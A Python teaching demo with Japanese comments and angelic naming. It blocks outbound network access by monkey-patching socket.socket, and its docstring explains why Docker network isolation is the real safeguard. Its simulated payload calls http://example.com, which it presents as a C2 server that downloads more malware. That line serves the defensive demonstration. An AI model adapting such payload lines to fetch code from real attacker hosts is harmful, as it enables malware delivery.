import os
import sys
import socket
import urllib.request
import time

class CassielsVeil:
    """
    【孤独の天使：結界 カシエル】
    隔離領域内で実行されるコードの外部通信（アウトバウンド）を論理的に完全遮断する。

    [2026-10 位置づけの明記] 本クラスは学習・デモ用であり、現行の実運用
    パイプラインには統合していない。理由は2つ:

      1. `socket.socket` をプロセスグローバルに置き換える実装のため、
         実運用ループ(src/ollama_agent_loop.py等)が依存する、ローカル
         Ollamaサーバーへの通信(socket経由)まで一緒に遮断してしまい、
         システム自体が機能不能になる。
      2. AI生成コードの動的実行は、既に`src/aegis_system.py`経由で
         Dockerコンテナの`--network none`によってOSレベルで通信遮断
         されている(src/docker_sandbox_executor.py)。本クラスの手法は
         プロセス単体のパッチに過ぎず、Dockerのネットワーク名前空間
         分離より弱い多重防御の一層にしかならず、かつ(1)の副作用を
         抱えるため、現行アーキテクチャ上は組み込む安全な場所がない。

    通信遮断の本線はDockerコンテナのネットワーク分離に委ね、本クラスは
    「audit hookより下の層(socket層)でも遮断できる」という設計思想を
    示す教材として保持する。
    """
    def __init__(self):
        self._original_socket = socket.socket
        self.is_sealed = False

    def activate_seal(self):
        if self.is_sealed:
            return
            
        print("\n[カシエルの結界] 孤独の天使が外界への通信経路を物理レイヤー(socket)から封鎖しました。")
        
        # Pythonの通信の最下層である socket.socket を強制的にオーバーライドして潰す
        def blocked_socket(*args, **kwargs):
            raise ConnectionRefusedError(
                "[カシエルの裁き] 外部ネットワークへの不正な接続試行を検知。通信は物理的に遮断されました。"
            )
        
        socket.socket = blocked_socket
        self.is_sealed = True

    def deactivate_seal(self):
        if self.is_sealed:
            socket.socket = self._original_socket
            self.is_sealed = False
            print("[カシエルの結界] 通信経路を復元しました。")

def simulate_network_breach():
    print("=== [Anjo-Core] カシエルの結界（アウトバウンド通信遮断） ===\n")
    print("[システム] anjo-da-maquina によるファイル監視に加え、通信監視プロトコルを起動。")
    
    veil = CassielsVeil()
    
    # 外部と通信しようとするサマエルの毒（ペイロード）を想定
    def malicious_network_payload():
        print("[毒蛇] 外部のC2サーバー (example.com) へ接続し、追加のマルウェアをダウンロードします...")
        time.sleep(1)
        # HTTPリクエスト（内部でsocketモジュールが使われる）
        response = urllib.request.urlopen("http://example.com", timeout=3)
        return response.read()

    # 1. 結界がない状態（危険）
    print(">> シナリオ1: 結界未展開の場合（通信が通ってしまう）")
    try:
        malicious_network_payload()
        print("=> [致命的エラー] サマエルが外界との通信に成功してしまいました！")
    except Exception as e:
        print(f"通信失敗: {e}")

    # 2. カシエルの結界を展開した状態（安全）
    print("\n>> シナリオ2: カシエルの結界を展開した場合")
    veil.activate_seal()
    
    try:
        malicious_network_payload()
    except Exception as e:
        print(f"\n=> [絶対防壁発動] {e}")
        print("=> [戦果] サマエルがいかに高度な通信コードを書こうとも、最下層でカシエルが首を跳ね飛ばしました。")
    finally:
        veil.deactivate_seal()

if __name__ == "__main__":
    simulate_network_breach()
